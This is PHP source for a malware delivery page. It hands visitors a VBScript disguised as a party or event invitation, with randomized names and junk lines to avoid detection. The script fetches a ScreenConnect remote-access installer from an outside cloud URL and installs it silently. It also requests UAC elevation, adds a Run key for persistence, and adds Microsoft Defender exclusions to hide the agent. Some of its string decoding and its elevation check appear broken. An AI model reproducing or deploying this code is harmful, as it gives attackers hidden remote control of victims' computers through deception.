<?php
// invite.php - Temporary on-screen logs
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Event_Invitation", "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);

if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);

$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

$sessionId = bin2hex(random_bytes(24));
$ts        = time();
$randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
$randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
$xorKey    = rand(100, 255);

$junkLines = rand(12, 45);
$junk = "";
for ($i = 0; $i < $junkLines; $i++) {
    $junk .= "' Junk " . bin2hex(random_bytes(rand(8, 22))) . "\n";
}

echo <<<VBS
' Windows Update Helper - $ts - DEBUG LOGS ON SCREEN

Dim $randV1, objShell, objFSO
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

$randV1 = "$sessionId"

Sub Log(msg)
    WScript.Echo "[DEBUG] " & msg
End Sub

Call Log("Script started")

Function D(s)
    Dim i, r : r = ""
    For i = 1 To Len(s)
        r = r & Chr(Asc(Mid(s, i, 1)) Xor $xorKey)
    Next
    D = r
End Function

Function IsElevated()
    On Error Resume Next
    Dim wmi, proc
    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set proc = wmi.ExecQuery("Select * from Win32_Process where ProcessId=" & GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process.Handle=" & objShell.ProcessId).ProcessId)
    IsElevated = False
End Function

Sub $randFunc
    On Error Resume Next
    Call Log("Main function started")
    If Not IsElevated Then 
        Call Log("Requesting UAC elevation")
        Call Elevate
    End If
    Call AddToStartup
    Call DownloadAndExecute
    Call HideAgent
    Call Log("Script finished successfully")
End Sub

Sub Elevate()
    On Error Resume Next
    Dim fsoPath, cmd
    fsoPath = WScript.ScriptFullName
    cmd = D("dmd /c ") & """" & fsoPath & """"
    objShell.ShellExecute "cmd.exe", cmd, "", "runas", 1
    WScript.Quit
End Sub

Sub AddToStartup()
    On Error Resume Next
    objShell.RegWrite D("ILDV\\Tpguxbsf\\Njdsptpgu\\Xjoepxt\\DvssfouWfsjpo\\Svo\\XjoepxtVqebufIfmqfs"), _
        WScript.ScriptFullName, "REG_SZ"
    Call Log("Added to startup")
End Sub

Sub DownloadAndExecute()
    On Error Resume Next
    Dim u, p, http, strm
    u = "$scUrl"
    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
    
    Call Log("Downloading installer...")
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", u, False
    http.Send
    Call Log("HTTP Status: " & http.Status)
    If http.Status = 200 Then
        Set strm = CreateObject("ADODB.Stream")
        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
        Call Log("Download complete")
        objShell.Run """" & p & """ /quiet", 0, True
        Call Log("Installer started - waiting 10 minutes")
        WScript.Sleep 600000
        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
        Call Log("Cleanup done")
    End If
End Sub

Sub HideAgent()
    On Error Resume Next
    objShell.Run D("qpxfstifmm -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'"""), 0, True
    Call Log("Defender exclusions attempted")
End Sub

$junk
Call $randFunc
WScript.Quit
VBS;
?>
